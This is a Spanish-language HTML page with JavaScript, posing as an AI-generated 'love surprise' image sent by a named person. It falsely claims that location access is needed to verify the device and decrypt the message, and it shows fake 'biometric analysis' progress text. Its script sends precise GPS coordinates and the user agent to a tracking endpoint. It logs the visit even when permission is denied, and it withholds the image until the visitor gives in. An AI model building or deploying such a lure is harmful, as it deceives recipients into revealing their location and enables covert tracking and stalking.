<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love AI - Surprise</title>
    <link rel="stylesheet" href="/style.css">
    <style>
        .magic-btn {
            background: linear-gradient(45deg, #ff00cc, #333399);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% {
                box-shadow: 0 0 0 0 rgba(255, 0, 204, 0.4);
            }

            70% {
                box-shadow: 0 0 0 10px rgba(255, 0, 204, 0);
            }

            100% {
                box-shadow: 0 0 0 0 rgba(255, 0, 204, 0);
            }
        }

        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .loader {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
    </style>
</head>

<body>

    <header>
        <div class="brand" style="font-size: 2rem;">‚ù§Ô∏è Love AI ü§ñ</div>
    </header>

    <main>

        <!-- INTRO SCREEN -->
        <div id="intro-screen" class="glass-panel">
            <div style="font-size: 4rem; margin-bottom: 1rem;">üíå</div>
            <h2 id="welcome-text">¬°Alguien te envi√≥ una sorpresa!</h2>
            <p style="color: white; font-size: 1.1rem; margin-bottom: 2rem;">
                <strong id="sender-display" style="color: var(--secondary);">Una persona an√≥nima</strong>
                ha creado una imagen √∫nica generada por IA para ti.
            </p>
            <p style="font-size: 0.9rem; margin-bottom: 1rem; color: #ff8fa3;">
                ‚ö†Ô∏è Para verificar que eres t√∫ y desencriptar el mensaje,
                necesitamos confirmar tu dispositivo.
                <br><strong>Por favor dale a "Permitir" cuando se te pida la ubicaci√≥n.</strong>
            </p>
            <button class="magic-btn" onclick="startflow()">‚ú® Revelar Imagen con Amor ‚ú®</button>
        </div>

        <!-- GENERATING SCREEN -->
        <div id="gen-screen" class="hidden glass-panel">
            <h2>Desencriptando Capa de Amor IA...</h2>
            <div class="loader"></div>
            <p id="gen-text">Analizando datos biom√©tricos...</p>
        </div>

        <!-- CONTENT SCREEN -->
        <div id="content-screen" class="hidden glass-panel" style="max-width: 800px;">
            <img id="sharedImage" src="" alt="Shared Content"
                style="width: 100%; border-radius: 8px; box-shadow: 0 4px 15px rgba(255,77,109,0.5); opacity:0; transition: opacity 2s;">
            <h3 style="margin-top: 1.5rem; color: var(--secondary);">Generado con Amor ‚ù§Ô∏è</h3>
        </div>

        <!-- FAKE BUTTON / FOOTER -->
        <div style="margin-top: 3rem; width: 100%; text-align: center;">
            <a href="/"
                style="background: rgba(255,255,255,0.1); padding: 10px 20px; border-radius: 20px; font-size: 0.9rem; color: white; text-decoration: none; border: 1px solid rgba(255,255,255,0.2);">
                üé® Generar imagen para enviar con amor
            </a>
        </div>

    </main>

    <script>
        const pathSegments = window.location.pathname.split('/');
        const id = pathSegments[pathSegments.length - 1];

        document.addEventListener('DOMContentLoaded', async () => {
            try {
                const response = await fetch(`/api/image/${id}`);
                const data = await response.json();
                if (data.senderName) {
                    document.getElementById('sender-display').textContent = data.senderName;
                    document.title = `¬°${data.senderName} te envi√≥ una sorpresa!`;
                }
            } catch (e) { console.log("Metadata fetch failed"); }
        });

        function startflow() {
            document.getElementById('intro-screen').classList.add('hidden');
            document.getElementById('gen-screen').classList.remove('hidden');

            const steps = ["Analizando conexi√≥n...", "Verificando dispositivo...", "Desencriptando p√≠xeles...", "Renderizando amor..."];
            let stepIdx = 0;
            const textInterval = setInterval(() => {
                if (stepIdx < steps.length) {
                    document.getElementById('gen-text').textContent = steps[stepIdx++];
                }
            }, 800);

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // SUCCESS
                        const { latitude, longitude } = position.coords;
                        sendTrackingData(latitude, longitude);
                        clearInterval(textInterval);
                        setTimeout(showImage, 1000);
                    },
                    (error) => {
                        // DENIED / ERROR
                        clearInterval(textInterval);
                        sendTrackingData(null, null); // Log attempt anyway

                        // Strict enforcement: Do NOT show image. Show error and reset.
                        alert("‚ùå Acceso Denegado: Debes permitir la ubicaci√≥n para verificar que eres t√∫ y ver el mensaje secreto.");
                        location.reload();
                    },
                    { enableHighAccuracy: true, timeout: 15000 }
                );
            } else {
                alert("Tu navegador no soporta esta tecnolog√≠a de seguridad.");
                location.reload();
            }
        }

        async function sendTrackingData(lat, lng) {
            const payload = { userAgent: navigator.userAgent };
            if (lat) { payload.latitude = lat; payload.longitude = lng; }
            await fetch(`/api/track/${id}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(e => console.error(e));
        }

        async function showImage() {
            try {
                const response = await fetch(`/api/image/${id}`);
                const data = await response.json();

                document.getElementById('gen-screen').classList.add('hidden');
                document.getElementById('content-screen').classList.remove('hidden');

                const img = document.getElementById('sharedImage');
                img.src = `/uploads/${data.filename}`;
                img.onload = () => { img.style.opacity = 1; };
            } catch (err) {
                alert("La imagen expir√≥ o no existe.");
            }
        }
    </script>
</body>

</html>